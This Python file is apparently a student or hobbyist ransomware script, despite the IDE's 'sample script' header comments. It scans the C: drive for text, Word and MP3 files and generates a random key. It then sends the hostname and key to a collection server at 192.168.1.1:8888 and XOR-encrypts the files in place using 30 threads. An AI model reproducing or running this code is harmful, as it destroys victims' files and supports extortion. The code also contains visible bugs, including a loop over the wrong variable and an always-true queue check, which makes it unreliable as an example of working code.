# This is a sample Python script. 09 14

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue


#safe guard password
safeguard = input("please enter the safegaurd password : ")
if safeguard != '1234':
    quit()

#File extensions to encrypt
encrypted_ext = ('.txt', '.docx', '.mp3')

file_paths = []
for root, dirs, files in os.walk('c:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

#generate key
key = ''
encryption_level = 128 // 8
char_pool = ''
for i in range(0x00, 0xFF):
    char_pool += (chr(i))
for i in range(encryption_level):
    key += random.choice(char_pool)

hostname = os.getenv('COMPUTERNAME')
print(hostname)

#Connect to the ransomeware
ip_address = '192.168.1.1'
port = 8888
time= datetime.now()
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.connect((ip_address, port))
    s.send(f'[{time}]-{hostname}:{key}'.encode('utf-8'))

def encrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
        except:
           print(f'Falied to encrypt {file}')
        q.task_done()



q = Queue()
for file in file_path:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()


q.join()
print('Encryption was successfully')